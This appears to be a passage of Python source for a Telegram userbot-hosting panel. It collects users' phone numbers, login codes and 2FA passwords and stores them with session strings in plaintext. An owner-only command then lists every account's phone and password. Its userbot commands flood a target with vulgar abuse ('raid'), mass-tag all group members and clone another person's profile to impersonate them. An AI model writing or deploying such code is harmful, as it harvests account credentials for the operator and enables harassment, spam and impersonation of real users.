import asyncio
import os
import sys
import random
import time
from datetime import datetime
from zoneinfo import ZoneInfo
from flask import Flask
from threading import Thread
from pymongo import MongoClient

from config import (
    API_ID,
    API_HASH,
    BOT_TOKEN,
    LOG_GROUP,
    MONGO_URL,
    DB_NAME,
    FSUB_CHANNELS,
    START_VIDEO,
    ALIVE_IMG,
    OWNER_ID,
    OWNER_USERNAME,
    PORT,
)

try:
    loop = asyncio.get_event_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

from pyrogram import Client, filters, errors, handlers, idle
from pyrogram.enums import ChatType
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_START_TIME = time.time()
ACCOUNTS_PER_PAGE = 5

# --- DATABASE CORE ---
try:
    mongo_client = MongoClient(MONGO_URL)
    db = mongo_client[DB_NAME]
    sessions_col = db["sessions"]
    users_col = db["users"]
    print("[SUCCESS] MongoDB Connected!")
except Exception as e:
    print(f"[ERROR] MongoDB Failed: {e}")
    sys.exit(1)


def save_bot_user(user):
    if not user:
        return
    try:
        users_col.update_one(
            {"user_id": int(user.id)},
            {
                "$set": {
                    "user_id": int(user.id),
                    "first_name": user.first_name or "User",
                    "username": user.username or "",
                    "last_seen": time.time(),
                }
            },
            upsert=True,
        )
    except Exception:
        pass


def get_all_bot_user_ids():
    ids = set()
    for col in (users_col, sessions_col):
        try:
            for doc in col.find({}, {"user_id": 1}):
                if "user_id" in doc:
                    ids.add(int(doc["user_id"]))
        except Exception:
            pass
    return list(ids)


def load_local_sessions():
    try:
        return {str(doc["user_id"]): doc for doc in sessions_col.find()}
    except Exception:
        return {}


def save_local_session(user_id, session_str, phone="", name="", username="", password=""):
    try:
        update_fields = {
            "user_id": str(user_id),
            "session_str": session_str,
            "updated_at": time.time(),
        }
        if phone:
            update_fields["phone"] = phone
        if name:
            update_fields["name"] = name
        if username is not None:
            update_fields["username"] = username
        if password:
            update_fields["password"] = password

        sessions_col.update_one(
            {"user_id": str(user_id)},
            {"$set": update_fields},
            upsert=True,
        )
    except Exception:
        pass


def get_readable_time(seconds: int) -> str:
    count = 0
    ping_time = ""
    time_list = []
    time_suffix_list = ["s", "m", "h", "ᴅᴀʏs"]
    while count < 4:
        count += 1
        if count < 3:
            remaining, time_to_add = divmod(seconds, 60)
        else:
            remaining, time_to_add = divmod(seconds, 24)
        if seconds == 0 and remaining == 0:
            break
        time_list.append(int(time_to_add))
        seconds = int(remaining)
    for x in range(len(time_list)):
        time_list[x] = str(time_list[x]) + time_suffix_list[x]
    if len(time_list) == 4:
        ping_time += time_list.pop() + ", "
    time_list.reverse()
    ping_time += ":".join(time_list)
    return ping_time or "0s"


# --- LOGGING HELPER ---
def format_user_tag(user):
    if not user:
        return "Unknown User (0)"
    uname = f"@{user.username}" if user.username else (user.first_name or "User")
    return f"{uname} ({user.id})"


def get_current_ist_time() -> str:
    now = datetime.now(ZoneInfo("Asia/Kolkata"))
    return now.strftime("%d %b %Y · %I:%M %p").upper()


async def send_log(c, title: str, user, details_body: str, panel_name: str = "CoderNovaBot"):
    try:
        user_str = format_user_tag(user)
        time_str = get_current_ist_time()
        log_msg = (
            f"━━━✦ 𝗡𝗢𝗩𝗔 𝗨𝗦𝗘𝗥𝗕𝗢𝗧 ✦ 𝗟𝗢𝗚𝗦 ✦━━━\n"
            f"✦ {title}\n\n"
            f"👤 𝗨𝗦𝗘𝗥: {user_str}\n"
            f"🕒 𝗧𝗜𝗠𝗘: {time_str}\n\n"
            f"📋 𝗗𝗘𝗧𝗔𝗜𝗟𝗦:\n"
            f"{details_body}\n\n"
            f"🤖 𝗣𝗔𝗡𝗘𝗟: {panel_name} · {OWNER_USERNAME}"
        )
        await c.send_message(LOG_GROUP, log_msg, disable_web_page_preview=True)
    except Exception as e:
        print(f"[LOG ERROR] Failed to send log: {e}")


# --- WEB SERVER ---
app = Flask("")


@app.route("/")
def home():
    return "Online ✨"


def run_web():
    app.run(host="0.0.0.0", port=PORT)


bot = Client(
    "CoderNovaGen",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    in_memory=True,
)
user_data, active_tasks, running_ubots, pm_guard_data, original_profiles = {}, {}, {}, {}, {}

clean_owner = OWNER_USERNAME.replace("@", "").strip() if OWNER_USERNAME else "CoderNova"

main_buttons = InlineKeyboardMarkup(
    [
        [
            InlineKeyboardButton("📲 ᴀᴅᴅ ᴀᴄᴄᴏᴜɴᴛ", callback_data="add_btn"),
            InlineKeyboardButton("🛠️ ʜᴇʟᴘ ᴍᴇɴᴜ", callback_data="help_btn"),
        ],
        [
            InlineKeyboardButton("👑 ᴏᴡɴᴇʀ", url=f"https://t.me/{clean_owner or 'CoderNova'}"),
            InlineKeyboardButton("📢 ᴜᴘᴅᴀᴛᴇ", url="https://t.me/NovaBot_Support"),
        ],
        [InlineKeyboardButton("❌ ᴄʟᴏsᴇ", callback_data="close")],
    ]
)

DAILY_CHATS = [
    "ʜɪɪ {mention}",
    "ᴋᴀɪsᴇ ʜᴏ {mention}",
    "ᴋʏᴀ ᴋʀ ʀʜᴇ ʜᴏ.. {mention}",
    "ᴋʜᴀ sᴇ ʜᴏ. {mention}",
    "ᴋʏᴀ ᴋʀᴛᴇ ʜᴏ {mention}",
    "ʀᴀᴅʜᴇ ʀᴀᴅʜᴇ {mention}",
    "ᴊᴀɪ sʜʀᴇᴇ ʀᴀᴍ {mention}",
    "ᴏʀ sᴜɴᴀᴏ sʙ ʙᴅɪʏᴀ {mention}",
    "ᴋʜᴀ ʀʜᴛᴇ ʜᴏ ᴀᴀᴊ ᴋᴀʟ ᴀᴀᴛᴇ ɴʜɪ ʜᴏ {mention}",
    "ᴠᴄ ᴀᴀʏᴀ ᴋʀ ʏʀ {mention}",
    "ɢʀᴏᴜᴘ ᴍᴇ ᴀᴀʏᴀ ᴋʀ ʏʀ {mention}",
    "ʀᴀᴍ ʀᴀᴍ {mention}",
    "ᴋᴋʀʜ {mention}",
    "ᴋʜᴀɴᴀ ᴋʜᴀʏᴇ {mention}",
    "ɢʜᴀʀ ᴍᴇ sʙ ᴋᴀɪsᴇ ʜʜ {mention}",
    "<b>ᴏʀ ᴘᴀᴅʜᴀɪ ᴋᴀɪsᴇ ᴄʜᴀʟ ʀʜᴇ ʜ</b> {mention}",
    "sᴛᴜᴅʏ ᴋʀᴛᴇ ʜᴏ ʏᴀ ɴʜɪ {mention}",
]

ABUSE_RAIDS = [
    "🥵💦 JUNGLE JUNGLE ME CHALA.... JUNGLE ME MILA BHALU... 🤣🤣🤣🤣",
    "EK DAAL PE.... CHAR... KABUTAR... 😁 CHARO MANGE DAANA... 😂😂😂😂",
    "JHULA... JHULO... LAKIN APNE BAAP KO... MT BHULO... 💦🥵💦🥵🥵",
    "BAAP.. KO... KHODNA.. OR... CHODNE.. NA.. SIKHATE... MERE.. BETE... 🥵💦🥵🥵",
    "ME.. TERA.. BAAP.. HU... 🥵💦🥵💦...",
    "CHUD.. GYA.. 🤣🤣😂🤣 CHUD... GYA.. BETE.. 💦🥵🥵🥵🥵💦🥵",
]


async def check_force_join(c, user_id):
    not_joined = []
    for channel in FSUB_CHANNELS:
        ch_clean = str(channel).lstrip("@")
        try:
            await c.get_chat_member(ch_clean, user_id)
        except errors.UserNotParticipant:
            not_joined.append(ch_clean)
        except Exception:
            pass
    return not_joined


# --- USERBOT HELPERS ---
async def resolve_raid_target_and_count(c, m):
    count = 10
    target_user = None
    args = m.text.split()[1:] if m.text else []

    for arg in args:
        if arg.isdigit() and int(arg) > 0:
            count = min(int(arg), 200)
        else:
            clean_arg = arg.lstrip("@")
            try:
                target_user = await c.get_users(int(clean_arg) if clean_arg.isdigit() else clean_arg)
            except Exception:
                pass

    if not target_user and m.reply_to_message and m.reply_to_message.from_user:
        target_user = m.reply_to_message.from_user

    return count, target_user


# --- USERBOT HANDLERS ---
async def ping_cmd(c, m):
    start_t = time.perf_counter()
    try:
        msg = await m.edit_text("🏓 **ᴘɪɴɢɪɴɢ...**")
    except Exception:
        msg = await c.send_message(m.chat.id, "🏓 **ᴘɪɴɢɪɴɢ...**")
    end_t = time.perf_counter()
    latency_ms = round((end_t - start_t) * 1000, 2)
    uptime = get_readable_time(int(time.time() - BOT_START_TIME))
    text = (
        f"⚡ **ᴘᴏɴɢ!**\n\n"
        f"📶 **ᴘɪɴɢ:** `{latency_ms} ms`\n"
        f"⏳ **ᴜᴘᴛɪᴍᴇ:** `{uptime}`\n"
        f"👤 **ᴀᴄᴄᴏᴜɴᴛ:** {c.me.mention}"
    )
    try:
        await msg.edit_text(text)
    except Exception:
        pass


async def info_cmd(c, m):
    target = None
    if len(m.command) > 1:
        raw_target = m.command[1].lstrip("@")
        try:
            target = await c.get_users(int(raw_target) if raw_target.isdigit() else raw_target)
        except Exception as e:
            try:
                return await m.edit_text(f"❌ **ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ:** `{e}`")
            except Exception:
                return
    elif m.reply_to_message and m.reply_to_message.from_user:
        target = m.reply_to_message.from_user
    else:
        target = c.me

    try:
        chat_info = await c.get_chat(target.id)
        bio = chat_info.bio or "ɴᴏɴᴇ"
    except Exception:
        bio = "ɴᴏɴᴇ"

    dc_id = getattr(target, "dc_id", None) or "ɴ/ᴀ"
    is_prem = "ʏᴇs" if getattr(target, "is_premium", False) else "ɴᴏ"
    uname = f"@{target.username}" if target.username else "ɴᴏɴᴇ"

    info_text = (
        f"🪪 **『 ᴀᴄᴄᴏᴜɴᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ 』** 🪪\n\n"
        f"👤 **ɴᴀᴍᴇ:** {target.first_name or 'ɴᴏɴᴇ'} {target.last_name or ''}\n"
        f"🆔 **ᴜsᴇʀ ɪᴅ:** `{target.id}`\n"
        f"🔗 **ᴜsᴇʀɴᴀᴍᴇ:** {uname}\n"
        f"🌐 **ᴅᴄ ɪᴅ:** `{dc_id}`\n"
        f"⭐ **ᴘʀᴇᴍɪᴜᴍ:** `{is_prem}`\n"
        f"📝 **ʙɪᴏ:** `{bio}`"
    )
    try:
        await m.edit_text(info_text)
    except Exception:
        try:
            await c.send_message(m.chat.id, info_text)
        except Exception:
            pass


async def alive_cmd(c, m):
    uptime = get_readable_time(int(time.time() - BOT_START_TIME))
    alive_text = (
        f"✨ **『 ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ ɪs ᴀʟɪᴠᴇ 』** ✨\n\n"
        f"⏳ **ᴜᴘᴛɪᴍᴇ:** `{uptime}`\n"
        f"👤 **ᴜsᴇʀ:** {c.me.mention}\n"
        f"👑 **ᴏᴡɴᴇʀ:** {OWNER_USERNAME}"
    )
    try:
        await m.delete()
        await c.send_photo(m.chat.id, photo=ALIVE_IMG, caption=alive_text)
    except Exception:
        try:
            await m.edit_text(alive_text)
        except Exception:
            pass


async def assistant_help_cmd(c, m):
    help_guide = (
        f"⚙️ **『 ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ ᴍᴇɴᴜ 』** ⚙️\n\n"
        f"🔹 **`.help`** - sʜᴏᴡs ᴛʜɪs ᴍᴇɴᴜ.\n"
        f"🔹 **`.alive`** - ᴄʜᴇᴄᴋ ᴜsᴇʀʙᴏᴛ sᴛᴀᴛᴜs.\n"
        f"🔹 **`.ping`** - ᴄʜᴇᴄᴋ ʟᴀᴛᴇɴᴄʏ & ᴜᴘᴛɪᴍᴇ.\n"
        f"🔹 **`.info [@user/id/reply]`** - ᴀᴄᴄᴏᴜɴᴛ ɪɴғᴏ.\n"
        f"🔹 **`.tagall [text]`** - sᴍᴏᴏᴛʜʟʏ ᴛᴀɢ ᴀʟʟ ᴍᴇᴍʙᴇʀs.\n"
        f"🔹 **`.onetag`** - sᴍᴏᴏᴛʜ sɪɴɢʟᴇ-ᴛᴀɢ ʟᴏᴏᴘ.\n"
        f"🔹 **`.raid [count] [@user/id/reply]`** - sᴛᴀʀᴛ ʀᴀɪᴅ.\n"
        f"🔹 **`.clone [@username/id/reply]`** - ᴄʟᴏɴᴇ ᴘʀᴏғɪʟᴇ.\n"
        f"🔹 **`.restclone`** - ʀᴇsᴛᴏʀᴇ ᴏʀɪɢɪɴᴀʟ ᴘʀᴏғɪʟᴇ.\n"
        f"🔹 **`.stop`** - sᴛᴏᴘ ᴀʟʟ ʀᴜɴɴɪɴɢ ʟᴏᴏᴘs."
    )
    try:
        await m.delete()
        await c.send_message(m.chat.id, help_guide)
    except Exception:
        try:
            await m.edit_text(help_guide)
        except Exception:
            pass


async def tagall_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True
    input_text = m.text.split(None, 1)[1] if len(m.command) > 1 else "ʜᴇʏ, ᴋᴀʜᴀɴ ʜᴏ sʙ?"
    try:
        await m.delete()
    except Exception:
        pass

    msg_counter = 0
    try:
        async for member in c.get_chat_members(m.chat.id):
            if not active_tasks.get(uid):
                break
            if not member.user or member.user.is_bot or member.user.is_deleted:
                continue
            try:
                mention = f"[{member.user.first_name or 'ᴜsᴇʀ'}](tg://user?id={member.user.id})"
                await c.send_message(m.chat.id, f"{input_text}\n\n{mention}")
                msg_counter += 1
                await asyncio.sleep(4.5 if msg_counter % 3 == 0 else 2.2)
            except errors.FloodWait as e:
                await asyncio.sleep(e.value + 2)
            except Exception:
                await asyncio.sleep(1.5)
    except Exception:
        pass
    finally:
        active_tasks[uid] = False


async def onetag_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True
    try:
        await m.delete()
    except Exception:
        pass

    msg_counter = 0
    try:
        async for member in c.get_chat_members(m.chat.id):
            if not active_tasks.get(uid):
                break
            if not member.user or member.user.is_bot or member.user.is_deleted:
                continue
            try:
                mention = f"[{member.user.first_name or 'ᴜsᴇʀ'}](tg://user?id={member.user.id})"
                msg = random.choice(DAILY_CHATS).format(mention=mention)
                await c.send_message(m.chat.id, msg)
                msg_counter += 1
                await asyncio.sleep(4.5 if msg_counter % 3 == 0 else 2.2)
            except errors.FloodWait as e:
                await asyncio.sleep(e.value + 2)
            except Exception:
                await asyncio.sleep(1.5)
    except Exception:
        pass
    finally:
        active_tasks[uid] = False


async def raid_cmd(c, m):
    uid = c.me.id
    count, target_user = await resolve_raid_target_and_count(c, m)

    if (
        m.chat.type not in [ChatType.PRIVATE, ChatType.BOT]
        and not m.reply_to_message
        and not target_user
    ):
        try:
            return await m.edit_text("❌ **ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ᴏʀ ɢɪᴠᴇ @ᴜsᴇʀɴᴀᴍᴇ / ᴜsᴇʀ_ɪᴅ!**")
        except Exception:
            return

    active_tasks[uid] = True
    try:
        await m.delete()
    except Exception:
        pass

    reply_to_id = m.reply_to_message.id if (m.reply_to_message and not target_user) else None
    msg_counter = 0

    for _ in range(count):
        if not active_tasks.get(uid):
            break
        line = random.choice(ABUSE_RAIDS)
        if target_user:
            tag = f"[{target_user.first_name or 'ᴜsᴇʀ'}](tg://user?id={target_user.id})"
            text_to_send = f"{tag} {line}"
        else:
            text_to_send = line

        try:
            await c.send_message(
                chat_id=m.chat.id,
                text=text_to_send,
                reply_to_message_id=reply_to_id,
            )
            msg_counter += 1
            await asyncio.sleep(4.0 if msg_counter % 3 == 0 else 2.0)
        except errors.FloodWait as e:
            await asyncio.sleep(e.value + 2)
        except Exception:
            await asyncio.sleep(1.5)

    active_tasks[uid] = False


async def clone_cmd(c, m):
    if len(m.command) < 2 and not m.reply_to_message:
        try:
            return await m.edit_text("❌ **ᴜsᴀɢᴇ:** `.clone @username` / `user_id` ᴏʀ ʀᴇᴘʟʏ.")
        except Exception:
            return

    raw_target = m.command[1].lstrip("@") if len(m.command) > 1 else m.reply_to_message.from_user.id
    try:
        status = await m.edit_text("🔄 **ᴄʟᴏɴɪɴɢ...**")
    except Exception:
        return

    try:
        uid = c.me.id
        if uid not in original_profiles:
            me_chat = await c.get_chat(uid)
            backup_photo_path = None
            my_photos = [p async for p in c.get_chat_photos(uid, limit=1)]
            if my_photos:
                try:
                    backup_photo_path = await c.download_media(my_photos[0].file_id)
                except Exception:
                    backup_photo_path = None
            original_profiles[uid] = {
                "first_name": c.me.first_name or "",
                "last_name": c.me.last_name or "",
                "bio": me_chat.bio or "",
                "photo_path": backup_photo_path,
            }

        user = await c.get_users(int(raw_target) if str(raw_target).isdigit() else raw_target)
        first_name = user.first_name or ""
        last_name = user.last_name or ""
        try:
            bio = (await c.get_chat(user.id)).bio or ""
        except Exception:
            bio = ""

        photos = [p async for p in c.get_chat_photos(user.id, limit=1)]
        if photos:
            try:
                photo_file = await c.download_media(photos[0].file_id)
                await c.set_profile_photo(photo=photo_file)
                if photo_file and os.path.exists(photo_file):
                    os.remove(photo_file)
            except Exception:
                pass

        await c.update_profile(first_name=first_name, last_name=last_name, bio=bio)
        await status.edit("✅ **sᴜᴄᴄᴇsғᴜʟʟʏ ᴄʟᴏɴᴇᴅ!**")
    except Exception as e:
        await status.edit(f"❌ **ғᴀɪʟᴇᴅ:** `{e}`")


async def restclone_cmd(c, m):
    uid = c.me.id
    backup = original_profiles.get(uid)
    if not backup:
        try:
            return await m.edit_text("⚠️ **ɴᴏ ᴏʀɪɢɪɴᴀʟ ᴘʀᴏғɪʟᴇ ʙᴀᴄᴋᴜᴘ ғᴏᴜɴᴅ (ᴘᴇʜʟᴇ `.clone` ᴜsᴇ ᴋᴀʀᴇɪɴ).**")
        except Exception:
            return

    try:
        status = await m.edit_text("♻️ **ʀᴇsᴛᴏʀɪɴɢ ᴏʀɪɢɪɴᴀʟ ᴘʀᴏғɪʟᴇ...**")
    except Exception:
        return

    try:
        await c.update_profile(
            first_name=backup.get("first_name", ""),
            last_name=backup.get("last_name", ""),
            bio=backup.get("bio", ""),
        )
        photo_path = backup.get("photo_path")
        if photo_path and os.path.exists(photo_path):
            try:
                await c.set_profile_photo(photo=photo_path)
                os.remove(photo_path)
            except Exception:
                pass
        del original_profiles[uid]
        await status.edit("✅ **ᴘʀᴏғɪʟᴇ ʀᴇsᴛᴏʀᴇᴅ ᴛᴏ ᴏʀɪɢɪɴᴀʟ!**")
    except Exception as e:
        await status.edit(f"❌ **ʀᴇsᴛᴏʀᴇ ғᴀɪʟᴇᴅ:** `{e}`")


async def stop_cmd(c, m):
    active_tasks[c.me.id] = False
    try:
        await m.edit_text("🚫 **ᴀʟʟ ᴘʀᴏᴄᴇssᴇs sᴛᴏᴘᴘᴇᴅ!**")
    except Exception:
        pass


# --- SAFE PM GUARD ---
async def pm_guard_handler(c, m):
    if m.chat.type != ChatType.PRIVATE or not m.from_user or m.from_user.is_bot or m.from_user.id == c.me.id:
        return
    try:
        if m.from_user.is_contact or m.from_user.id == OWNER_ID:
            return
        ubot_id = c.me.id
        stranger_id = m.from_user.id
        pm_guard_data.setdefault(ubot_id, {})
        pm_guard_data[ubot_id][stranger_id] = pm_guard_data[ubot_id].get(stranger_id, 0) + 1
        warn_count = pm_guard_data[ubot_id][stranger_id]

        if warn_count >= 5:
            try:
                await m.reply_text("🚨 **sᴘᴀᴍ ʟɪᴍɪᴛ ᴇxᴄᴇᴇᴅᴇᴅ! ʏᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ʙʟᴏᴄᴋᴇᴅ.**")
                await c.block_user(stranger_id)
            except Exception:
                pass
            del pm_guard_data[ubot_id][stranger_id]
        else:
            try:
                await m.reply_text(
                    f"🔒 **ʜᴇʟʟᴏ! ᴏᴡɴᴇʀ ᴀʙʜɪ ᴏғғʟɪɴᴇ ʜᴀɪɴ.**\n⚠️ **ᴡᴀʀɴɪɴɢ:** `{warn_count}/5`"
                )
            except Exception:
                pass
    except Exception:
        pass


def register_ubot_handlers(ubot):
    ubot.add_handler(handlers.MessageHandler(assistant_help_cmd, filters.command("help", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(alive_cmd, filters.command("alive", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(ping_cmd, filters.command("ping", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(info_cmd, filters.command("info", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(tagall_cmd, filters.command("tagall", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(onetag_cmd, filters.command("onetag", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(raid_cmd, filters.command("raid", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(clone_cmd, filters.command("clone", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(restclone_cmd, filters.command("restclone", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(stop_cmd, filters.command("stop", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(pm_guard_handler, filters.private & ~filters.me), group=2)


# --- MAIN BOT COMMANDS ---
START_TEXT = (
    "⚡ **ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴘᴀɴᴇʟ** ⚡\n\n"
    "ʜᴇʏ {mention},\n"
    "ᴀᴘɴᴀ ᴜsᴇʀʙᴏᴛ ᴍᴀɴᴀɢᴇ ᴋᴀʀɴᴇ ᴋᴇ ʟɪʏᴇ ɴɪᴄʜᴇ ʙᴜᴛᴛᴏɴs ᴜsᴇ ᴋᴀʀᴇɪɴ."
)

GUIDE_TEXT = (
    "📖 **『 ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ ɢᴜɪᴅᴇ 』** 📖\n\n"
    "1️⃣ **ᴀᴄᴄᴏᴜɴᴛ ᴀᴅᴅ ᴋᴀʀᴇɪɴ:** `/add_account` ʏᴀ **📲 ᴀᴅᴅ ᴀᴄᴄᴏᴜɴᴛ** ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀᴇɪɴ.\n"
    "2️⃣ **ᴘʜᴏɴᴇ & ᴏᴛᴘ:** `+91xxxxxxxxxx` ʙʜᴇᴊᴇɪɴ, ᴘʜɪʀ sᴘᴀᴄᴇ ᴋᴇ sᴀᴛʜ ᴏᴛᴘ (`1 2 3 4 5`) ᴅᴀʟᴇɪɴ.\n"
    "3️⃣ **2FA:** ᴀɢᴀʀ 2FA ᴏɴ ʜᴀɪ ᴛᴏ ᴘᴀssᴡᴏʀᴅ ᴇɴᴛᴇʀ ᴋᴀʀᴇɪɴ.\n"
    "4️⃣ **ᴜsᴇʀʙᴏᴛ ᴄᴏᴍᴍᴀɴᴅs:** ᴋɪsɪ ʙʜɪ ᴄʜᴀᴛ ᴍᴇ `.help` ʟɪᴋʜᴇɪɴ.\n"
    "5️⃣ **sᴛᴏᴘ ʟᴏᴏᴘs:** ᴛᴀɢ/ʀᴀɪᴅ ʀᴏᴋɴᴇ ᴋᴇ ʟɪʏᴇ `.stop` ᴜsᴇ ᴋᴀʀᴇɪɴ."
)

HELP_BOT_TEXT = (
    "🛠️ **『 ʙᴏᴛ ᴄᴏᴍᴍᴀɴᴅs ᴍᴇɴᴜ 』** 🛠️\n\n"
    "🔹 `/start` - sᴛᴀʀᴛ ᴘᴀɴᴇʟ\n"
    "🔹 `/add_account` - ᴀᴅᴅ ɴᴇᴡ ᴜsᴇʀʙᴏᴛ ᴀᴄᴄᴏᴜɴᴛ\n"
    "🔹 `/guide` - sᴛᴇᴘ-ʙʏ-sᴛᴇᴘ ᴜsᴇʀ ɢᴜɪᴅᴇ\n"
    "🔹 `/help` - sʜᴏᴡ ᴛʜɪs ᴍᴇɴᴜ\n"
    "👑 **ᴏᴡɴᴇʀ ᴄᴏᴍᴍᴀɴᴅs:**\n"
    "🔸 `/account_list` - ᴘᴀɢɪɴᴀᴛᴇᴅ ᴀᴄᴄᴏᴜɴᴛs (5/ᴘᴀɢᴇ)\n"
    "🔸 `/update_all` - ʀᴇʟᴏᴀᴅ & ᴜᴘᴅᴀᴛᴇ ᴀʟʟ ᴀᴄᴄᴏᴜɴᴛs\n"
    "🔸 `/remove_all` - ʀᴇᴍᴏᴠᴇ ᴀʟʟ sᴇssɪᴏɴs\n"
    "🔸 `/broadcast` - ʙʀᴏᴀᴅᴄᴀsᴛ ᴛᴏ ᴀʟʟ ᴜsᴇʀs"
)


async def build_account_list_page(page: int = 0):
    saved = load_local_sessions()
    docs = list(saved.values())
    total_accounts = len(docs)

    if total_accounts == 0:
        return "📭 **ɴᴏ ᴀᴄᴄᴏᴜɴᴛs ғᴏᴜɴᴅ ɪɴ ᴅᴀᴛᴀʙᴀsᴇ.**", None

    total_pages = max(1, (total_accounts + ACCOUNTS_PER_PAGE - 1) // ACCOUNTS_PER_PAGE)
    page = max(0, min(page, total_pages - 1))

    start_idx = page * ACCOUNTS_PER_PAGE
    end_idx = start_idx + ACCOUNTS_PER_PAGE
    page_docs = docs[start_idx:end_idx]

    lines = [
        f"📋 **『 ᴀᴄᴄᴏᴜɴᴛs ʟɪsᴛ (ᴘᴀɢᴇ {page + 1}/{total_pages}) 』** 📋\n",
        f"📊 **ᴛᴏᴛᴀʟ ᴀᴄᴄᴏᴜɴᴛs:** `{total_accounts}`\n",
    ]

    for idx, doc in enumerate(page_docs, start=start_idx + 1):
        uid_str = str(doc.get("user_id", "0"))
        uid_int = int(uid_str) if uid_str.isdigit() else 0
        status_badge = "🟢" if uid_int in running_ubots else "🔴"

        name = doc.get("name") or "ɴᴏɴᴇ"
        raw_uname = doc.get("username") or ""
        username = f"@{raw_uname.lstrip('@')}" if raw_uname else "ɴᴏɴᴇ"
        phone = doc.get("phone") or "ɴᴏɴᴇ"
        password = doc.get("password") or "ɴᴏɴᴇ"

        lines.append(
            f"{status_badge} **`{idx}.`**\n"
            f"   • **ɴᴀᴍᴇ:** {name}\n"
            f"   • **ᴜsᴇʀɴᴀᴍᴇ:** {username}\n"
            f"   • **ᴘʜᴏɴᴇ:** `{phone}`\n"
            f"   • **ᴘᴀssᴡᴏʀᴅ:** `{password}`"
        )

    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton("⬅️ ʙᴀᴄᴋ", callback_data=f"acc_page_{page - 1}"))
    if page < total_pages - 1:
        nav_row.append(InlineKeyboardButton("ɴᴇxᴛ ➡️", callback_data=f"acc_page_{page + 1}"))

    buttons = []
    if nav_row:
        buttons.append(nav_row)
    buttons.append([InlineKeyboardButton("❌ ᴄʟᴏsᴇ", callback_data="close")])

    return "\n\n".join(lines), InlineKeyboardMarkup(buttons)


async def restart_all_userbots():
    for uid, old_ubot in list(running_ubots.items()):
        try:
            await old_ubot.stop()
        except Exception:
            pass
    running_ubots.clear()

    saved_sessions = load_local_sessions()
    updated, failed = 0, 0

    for u_id, doc in saved_sessions.items():
        session_str = doc.get("session_str")
        if not session_str:
            failed += 1
            continue
        try:
            ubot = Client(
                f"ubot_{u_id}_{int(time.time() * 1000)}",
                api_id=API_ID,
                api_hash=API_HASH,
                session_string=session_str,
                in_memory=True,
            )
            register_ubot_handlers(ubot)
            await ubot.start()
            me = await ubot.get_me()
            save_local_session(
                u_id,
                session_str,
                phone=doc.get("phone", ""),
                name=f"{me.first_name or ''} {me.last_name or ''}".strip() or doc.get("name", "User"),
                username=me.username or doc.get("username", ""),
                password=doc.get("password", ""),
            )
            running_ubots[int(u_id)] = ubot
            updated += 1
            await asyncio.sleep(0.25)
        except Exception:
            failed += 1

    return updated, failed


@bot.on_message(filters.command("start") & filters.private)
async def start_handler(c, m):
    save_bot_user(m.from_user)
    bot_me = await c.get_me()
    await send_log(
        c,
        title="𝗡𝗘𝗪 𝗦𝗧𝗔𝗥𝗧 𝗔𝗟𝗘𝗥𝗧 · [𝗦𝗧𝗔𝗥𝗧]",
        user=m.from_user,
        details_body=f"✦ 𝗨𝗦𝗘𝗥 {(m.from_user.first_name or 'USER').upper()} 𝗢𝗣𝗘𝗡𝗘𝗗 {bot_me.username or 'CoderNovaBot'}.",
        panel_name=bot_me.username or "CoderNovaBot",
    )

    unjoined = await check_force_join(c, m.from_user.id)
    if unjoined:
        btn_layout = [[InlineKeyboardButton("📥 ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ", url=f"https://t.me/{ch}")] for ch in unjoined]
        btn_layout.append([InlineKeyboardButton("🔄 ᴠᴇʀɪғʏ", callback_data="verify_fsub")])
        return await m.reply_text(
            "⚠️ **ᴘʟᴇᴀsᴇ ᴊᴏɪɴ ᴏᴜʀ ᴄʜᴀɴɴᴇʟs ғɪʀsᴛ:**",
            reply_markup=InlineKeyboardMarkup(btn_layout),
        )
    try:
        await m.reply_animation(
            animation=START_VIDEO,
            caption=START_TEXT.format(mention=m.from_user.mention),
            reply_markup=main_buttons,
        )
    except Exception:
        await m.reply_text(START_TEXT.format(mention=m.from_user.mention), reply_markup=main_buttons)


@bot.on_message(filters.command("add_account") & filters.private)
async def add_account_cmd(c, m):
    save_bot_user(m.from_user)
    await m.reply_text("📲 **sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ (+91xxxxxxxxxx):**")


@bot.on_message(filters.command("guide") & filters.private)
async def guide_cmd(c, m):
    save_bot_user(m.from_user)
    await m.reply_text(GUIDE_TEXT, reply_markup=main_buttons)


@bot.on_message(filters.command("help") & filters.private)
async def help_cmd(c, m):
    save_bot_user(m.from_user)
    await m.reply_text(HELP_BOT_TEXT, reply_markup=main_buttons)


@bot.on_message(filters.command("account_list") & filters.user(OWNER_ID))
async def account_list_cmd(c, m):
    text, markup = await build_account_list_page(0)
    await m.reply_text(text, reply_markup=markup)


@bot.on_message(filters.command("update_all") & filters.user(OWNER_ID))
async def update_all_cmd(c, m):
